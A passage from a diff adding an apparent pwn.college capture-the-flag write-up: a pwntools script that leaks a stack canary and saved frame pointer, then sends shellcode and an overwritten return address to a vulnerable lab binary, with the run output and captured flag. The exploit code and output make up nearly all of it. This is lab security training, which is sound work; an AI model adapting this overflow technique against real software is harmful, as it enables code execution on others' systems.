+payload_size = offset_to_canary + 8 + offset_to_rbp
+
+# Send payload_size
+p.recvuntil(b"Payload size: ")
+p.sendline(str(payload_size).encode())
+
+# Craft payload
+payload = b"REPEAT"
+payload += b"A" * (offset_to_canary - 6)
+payload += b"B"
+
+# Send payload
+p.recvuntil(b"bytes)!")
+p.send(payload)
+
+output = p.recvuntil(b'AAAAAB')
+output_str = output.decode()
+
+# Extract canary (7 bytes because the null byte was overwritten)
+canary_raw = p.recv(7)
+canary = u64(canary_raw.rjust(8, b'\x00'))
+
+# Extract the Saved RBP (usually 6 bytes are non-zero in a 0x7ff... address)
+# We can read 6 bytes and pad it to 8.
+stored_rbp_raw = p.recv(6)
+stored_rbp = u64(stored_rbp_raw.ljust(8, b'\x00'))
+
+print(f"Canary     : {hex(canary)}")
+print(f"Stored RBP : {hex(stored_rbp)}")
+
+
+# --- STAGE 3: FINAL PAYLOAD ---
+# Shellcode
+shellcode_asm = """
+   /* chmod("z", 0004) */
+   push 0x5a
+   push rsp
+   pop rdi
+   pop rax
+   mov sil, 0x4
+   syscall
+"""
+shellcode_addr = stored_rbp - 8 - offset_to_canary - (2 * offset_buffers_diff_challenge_frames)
+shellcode = asm(shellcode_asm)
+len_shellcode = len(shellcode)
+print(f"Shellcode length: {len_shellcode}")
+
+# Calculate offset_to_ret and payload_size
+# offset_to_ret = addr_of_saved_ip - (canary_addr + 8)
+payload_size = offset_to_canary + 8 + 8 + 8
+
+# Send payload size
+p.recvuntil(b"Payload size: ")
+p.sendline(str(payload_size).encode())
+
+# Craft payload
+payload = shellcode
+payload += b"A" * (offset_to_canary - (len_shellcode + 8))
+payload += p64(no_exit_value)
+payload += p64(canary)
+payload += b"B" * 8
+payload += p64(shellcode_addr)
+
+# Send payload
+p.recvuntil(b"bytes)!")
+p.send(payload)
+
+p.interactive()
+```
+
+```
+hacker@program-security~a-crafty-clobber-hard:~$ python ~/script.py 
+Canary : 0x9470f89cb1e72f00
+Canary     : 0x9470f89cb1e72f00
+Stored RBP : 0x7ffdd9c58e40
+Shellcode length: 10
+
+You said: jZT_X@\xb6\x04\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq\xa6\x93Bʬ\xf9:
+Goodbye!
+exit() condition avoided! Continuing execution.
+$  
+```
+
+```
+hacker@program-security~a-crafty-clobber-hard:~$ cat ~/Z
+pwn.college{EQf_cMvGimapk5C6wtgB4JrjY1M.0lNyMDL4ITM0EzW}
 ```
